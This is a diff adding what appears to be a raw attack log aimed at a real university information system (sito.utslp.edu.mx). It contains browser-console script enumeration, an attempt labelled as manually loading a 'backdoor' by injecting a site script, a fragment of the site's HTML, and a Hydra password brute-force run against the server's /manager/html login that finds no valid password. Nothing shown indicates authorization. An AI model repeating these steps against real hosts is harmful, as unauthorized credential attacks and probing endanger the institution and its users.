@@ -1,0 +1,59 @@
+console.log("=== ANÁLISIS DE SCRIPTS ===");
+Array.from(document.scripts).forEach((script, index) => {
+    console.log(`Script ${index}:`, script.src || 'inline');
+});
+=== ANÁLISIS DE SCRIPTS === debugger eval code:1:9
+Script 0: https://sito.utslp.edu.mx/javascript/utilities.js debugger eval code:3:13
+Script 1: https://sito.utslp.edu.mx/javascript/jquery/jquery-1.5.1.min.js debugger eval code:3:13
+Script 2: https://sito.utslp.edu.mx/javascript/jquery/jquery-ui-1.8.2.min.js debugger eval code:3:13
+Script 3: inline debugger eval code:3:13
+Script 4: https://sito.utslp.edu.mx/javascript/scriptAnimaciones.js debugger eval code:3:13
+Script 5: inline debugger eval code:3:13
+Script 6: inline
+
+=== CARGANDO BACKDOOR MANUALMENTE === debugger eval code:1:9
+<script src="https://sito.utslp.edu.m…ipt/scriptAnimaciones.js">
+
+✅ Script cargado correctamente debugger eval code:5:13
+Funciones disponibles: debugger eval code:6:13
+C(): undefined debugger eval code:7:13
+A(): undefined debugger eval code:8:13
+z(): undefined debugger eval code:9:13
+y(): undefined debugger eval code:10:13
+C();
+Uncaught ReferenceError: C is not defined
+    <anonymous> debugger eval code:1
+debugger eval code:1:1
+    <anonymous> debugger eval code:1
+document.head.appendChild(script);
+<script src="https://sito.utslp.edu.m…ipt/scriptAnimaciones.js">
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title> Sistema de Informaci�n T�ctico Operativo </title>
+
+	<link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+	<link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+	<link rel="stylesheet" href="/styles2/cells.css" type="text/css">
+	<link rel="stylesheet" href="/styles2/characters.css" type="text/css">
+</head>
+
+<body>
+<form name="forma" method="post" action="">
+	<br>
+	<table class="TablaDatosTitulo" width="100%" align="center" cellpadding="0" cellspacing="0">
+
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Hydra]
+└──╼ $hydra -L users_sito.txt -P passes_sito.txt sito.utslp.edu.mx https-get /manager/html
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-02 16:29:21
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 437 login tries (l:19/p:23), ~28 tries per task
+[DATA] attacking http-gets://sito.utslp.edu.mx:443/manager/html
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-02 16:29:53
+
+
